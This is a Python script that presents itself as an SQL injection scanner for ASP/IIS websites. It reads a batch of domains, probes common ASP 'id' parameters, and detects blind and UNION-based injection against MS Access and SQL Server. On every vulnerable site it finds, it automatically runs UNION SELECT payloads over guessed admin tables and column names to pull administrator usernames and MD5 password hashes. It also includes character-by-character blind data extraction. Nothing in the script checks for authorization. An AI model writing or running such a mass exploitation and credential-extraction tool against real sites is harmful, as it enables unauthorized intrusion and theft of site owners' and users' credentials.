#!/usr/bin/env python3
"""SQL Injection Scanner for ASP/IIS sites"""
import json
import subprocess
import time
import re
import sys
import hashlib
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Common ASP parameters to test
ASP_PARAMS = [
    'news.asp?id=', 'News.asp?id=',
    'product.asp?id=', 'Product.asp?id=',
    'products.asp?id=', 'Products.asp?id=',
    'show.asp?id=', 'Show.asp?id=',
    'shownews.asp?id=', 'ShowNews.asp?id=',
    'class.asp?id=', 'Class.asp?id=',
    'about.asp?id=', 'About.asp?id=',
    'content.asp?id=', 'Content.asp?id=',
    'detail.asp?id=', 'Detail.asp?id=',
    'info.asp?id=', 'Info.asp?id=',
    'article.asp?id=', 'Article.asp?id=',
    'list.asp?id=', 'List.asp?id=',
    'view.asp?id=', 'View.asp?id=',
    'read.asp?id=', 'Read.asp?id=',
    'display.asp?id=', 'Display.asp?id=',
    'page.asp?id=', 'Page.asp?id=',
    'type.asp?id=', 'Type.asp?id=',
    'index.asp?id=', 'Index.asp?id=',
    'class1_index.asp?id=',
    'class_index.asp?id=',
]

def curl(url, timeout=15):
    """Make HTTP request with curl"""
    try:
        cmd = ['curl', '-s', '-m', str(timeout), '-k', '-L',
               '--max-redirs', '2',
               '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
               url]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        return result.stdout, result.returncode
    except Exception as e:
        return '', -1

def normalize_body(body):
    """Normalize body for comparison"""
    body = re.sub(r'\d{4}[-/]\d{2}[-/]\d{2}', '', body)
    body = re.sub(r'\d{2}:\d{2}:\d{2}', '', body)
    body = re.sub(r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b', '', body)
    body = body.strip()
    body = re.sub(r'\s+', ' ', body)
    return body

def check_param_live(base_url, param_template):
    """Check if a parameter endpoint exists"""
    test_urls = []
    base = base_url.rstrip('/')
    
    for pt in [param_template] if isinstance(param_template, str) else param_template:
        url = f"{base}/{pt}1"
        body, code = curl(url, timeout=10)
        if body and len(body) > 100 and code == 0:
            lower = body.lower()
            if not any(x in lower for x in ['not found', '404', 'doesnotexist', 'no input file']):
                test_urls.append((pt, url, body))
    
    return test_urls

def detect_sqli_access(base_url, param_template, id_val=1):
    """Detect MS Access SQLi using IIF boolean blind"""
    base = base_url.rstrip('/')
    pt = param_template
    
    # Baseline request
    url_normal = f"{base}/{pt}{id_val}"
    body_normal, _ = curl(url_normal)
    if not body_normal or len(body_normal) < 100:
        return None, None
    
    norm_normal = normalize_body(body_normal)
    
    # True condition: IIF(1=1,1,0)
    payload_true = f"{id_val} AND IIF(1=1,1,0)=1"
    url_true = f"{base}/{pt}{payload_true}"
    body_true, _ = curl(url_true)
    if not body_true:
        return None, None
    norm_true = normalize_body(body_true)
    
    # False condition: IIF(1=2,1,0)
    payload_false = f"{id_val} AND IIF(1=2,1,0)=1"
    url_false = f"{base}/{pt}{payload_false}"
    body_false, _ = curl(url_false)
    if not body_false:
        return None, None
    norm_false = normalize_body(body_false)
    
    # Compare responses
    true_matches_normal = (norm_true == norm_normal) or (len(body_true) == len(body_normal))
    false_differs = (norm_false != norm_normal) and (len(body_false) != len(body_normal))
    true_diff_false = (norm_true != norm_false) or (len(body_true) != len(body_false))
    
    if true_matches_normal and false_differs:
        return 'access', 'boolean_blind_iif'
    
    # Also try SQL Server style: 1=1 vs 1=2
    payload_true2 = f"{id_val} AND 1=1"
    url_true2 = f"{base}/{pt}{payload_true2}"
    body_true2, _ = curl(url_true2)
    if body_true2:
        norm_true2 = normalize_body(body_true2)
        
        payload_false2 = f"{id_val} AND 1=2"
        url_false2 = f"{base}/{pt}{payload_false2}"
        body_false2, _ = curl(url_false2)
        if body_false2:
            norm_false2 = normalize_body(body_false2)
            
            t2_match = (norm_true2 == norm_normal) or (abs(len(body_true2) - len(body_normal)) < 10)
            f2_diff = (norm_false2 != norm_normal) and (abs(len(body_false2) - len(body_normal)) > 10)
            
            if t2_match and f2_diff:
                return 'mssql', 'boolean_blind_1=1'
    
    # Try union select approach 
    union_payloads = [
        f"{id_val} UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM admin",
        f"{id_val} UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM Admin",
        f"{id_val} UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users",
        f"{id_val} UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM Users",
        f"{id_val} UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM manager",
        f"{id_val} UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM Manager",
    ]
    for up in union_payloads:
        url_union = f"{base}/{pt}{up}"
        body_union, _ = curl(url_union)
        if body_union and len(body_union) > 100:
            if any(str(n) in body_union for n in range(1, 11)):
                return 'access', 'union_select'
    
    return None, None

def extract_admin_creds_access(base_url, param_template, id_val=1):
    """Extract admin credentials from MS Access database"""
    base = base_url.rstrip('/')
    pt = param_template
    results = []
    
    tables = ['admin', 'Admin', 'ADMIN', 'users', 'Users', 'manager', 'Manager', 'user', 'User',
              'guanliyuan', 'system', 'config', 'manage']
    col_pairs = [
        ('username', 'password'), ('username', 'passwd'), ('user', 'pass'),
        ('admin', 'password'), ('name', 'pass'), ('userid', 'pwd'),
        ('uname', 'upass'), ('loginname', 'loginpass'), ('adminname', 'adminpass'),
        ('yonghu', 'mima'), ('uname', 'pwd'), ('uid', 'pwd'),
        ('user_name', 'user_pass'), ('userid', 'userpass'),
    ]
    
    for col_cnt in range(3, 21):
        cols_list = [str(i) for i in range(1, col_cnt + 1)]
        cols_rest = ','.join(cols_list[2:])  # Skip first 2 for username/password
        for table in tables:
            for ucol, pcol in col_pairs:
                payload = f"{id_val} UNION SELECT {ucol},{pcol},{cols_rest} FROM {table}"
                url = f"{base}/{pt}{payload}"
                body, _ = curl(url, timeout=12)
                if body and len(body) > 200:
                    lines = body.split('\n')
                    for line in lines:
                        line_stripped = line.strip()
                        if 3 < len(line_stripped) < 200:
                            if not any(x in line_stripped.lower() for x in ['html', 'script', 'style', '<div', '<td', '<p']):
                                md5_pattern = r'\b([a-fA-F0-9]{32})\b'
                                md5_16_pattern = r'\b([a-fA-F0-9]{16})\b'
                                
                                md5s = re.findall(md5_pattern, line_stripped)
                                md5_16s = re.findall(md5_16_pattern, line_stripped)
                                
                                if md5s or md5_16s:
                                    parts = line_stripped.split()
                                    clean_parts = [p for p in parts if len(p) > 2]
                                    if len(clean_parts) >= 2:
                                        results.append({
                                            'table': table,
                                            'username_col': ucol,
                                            'password_col': pcol,
                                            'data': clean_parts,
                                            'hashes': md5s + md5_16s,
                                            'snippet': line_stripped[:300]
                                        })
    
    return results[:20]


def boolean_extract_char(base_url, param_template, condition, id_val=1):
    """Use boolean blind to extract a single bit of information"""
    base = base_url.rstrip('/')
    pt = param_template
    
    url = f"{base}/{pt}{id_val} AND IIF({condition},1,0)=1"
    body, _ = curl(url)
    if not body:
        return None
    
    url_normal = f"{base}/{pt}{id_val}"
    body_normal, _ = curl(url_normal)
    if not body_normal:
        return None
    
    return len(body) >= len(body_normal) * 0.8


def extract_string_blind(base_url, param_template, query, max_len=50, id_val=1):
    """Extract a string character by character using boolean blind"""
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char_code in range(32, 127):
            cond = f"ASC(MID(({query}),{pos},1))={char_code}"
            if boolean_extract_char(base_url, param_template, cond, id_val):
                result += chr(char_code)
                found = True
                break
        if not found:
            break
    return result


def quick_param_scan(site):
    """Quick scan to find live parameters only"""
    domain = site['domain']
    results = []
    
    for proto in ['http', 'https']:
        base_url = f"{proto}://{domain}"
        for param in ASP_PARAMS:
            live = check_param_live(base_url, param)
            if live:
                for pt, url, _ in live:
                    results.append((base_url, pt))
    
    return results


def scan_site(site):
    """Scan a single site for SQLi"""
    domain = site['domain']
    server = site['server']
    
    print(f"\n{'='*70}")
    print(f"Scanning: {domain} ({server})")
    print(f"{'='*70}")
    
    results = []
    
    for proto in ['http', 'https']:
        base_url = f"{proto}://{domain}"
        
        for param in ASP_PARAMS:
            live_params = check_param_live(base_url, param)
            for pt, url, body in live_params:
                print(f"  [LIVE] {url[:100]}")
                
                db_type, sqli_type = detect_sqli_access(base_url, pt)
                
                if db_type:
                    print(f"  [!] SQLi FOUND: {db_type} - {sqli_type}")
                    print(f"  [!] URL: {base_url}/{pt}")
                    
                    creds = extract_admin_creds_access(base_url, pt)
                    
                    finding = {
                        'domain': domain,
                        'server': server,
                        'base_url': base_url,
                        'param': pt,
                        'db_type': db_type,
                        'sqli_type': sqli_type,
                        'credentials': creds
                    }
                    
                    if creds:
                        for c in creds:
                            print(f"  [CREDS] Table={c['table']} | {c['snippet'][:150]}")
                    
                    results.append(finding)
    
    return results


if __name__ == '__main__':
    with open('/tmp/asp_sites.json') as f:
        sites = json.load(f)
    
    mode = sys.argv[1] if len(sys.argv) > 1 else 'quick'
    
    if mode == 'quick':
        print(f"Quick parameter discovery for {len(sites)} sites...")
        all_params = {}
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = {ex.submit(quick_param_scan, s): s for s in sites}
            for f in as_completed(futures):
                site = futures[f]
                params = f.result()
                if params:
                    all_params[site['domain']] = params
                    print(f"  {site['domain']}: {len(params)} live params")
                    for base, pt in params:
                        print(f"    -> {base}/{pt}...")
        
        with open('/tmp/live_params.json', 'w') as f:
            json.dump(all_params, f, ensure_ascii=False, indent=2)
        print(f"\nSaved {len(all_params)} sites with live params to /tmp/live_params.json")
    
    elif mode == 'scan':
        print(f"Full SQLi scan for {len(sites)} sites...")
        all_findings = []
        for site in sites:
            findings = scan_site(site)
            if findings:
                all_findings.extend(findings)
        
        with open('/tmp/sqli_findings.json', 'w') as f:
            json.dump(all_findings, f, ensure_ascii=False, indent=2)
        print(f"\nSaved {len(all_findings)} findings to /tmp/sqli_findings.json")
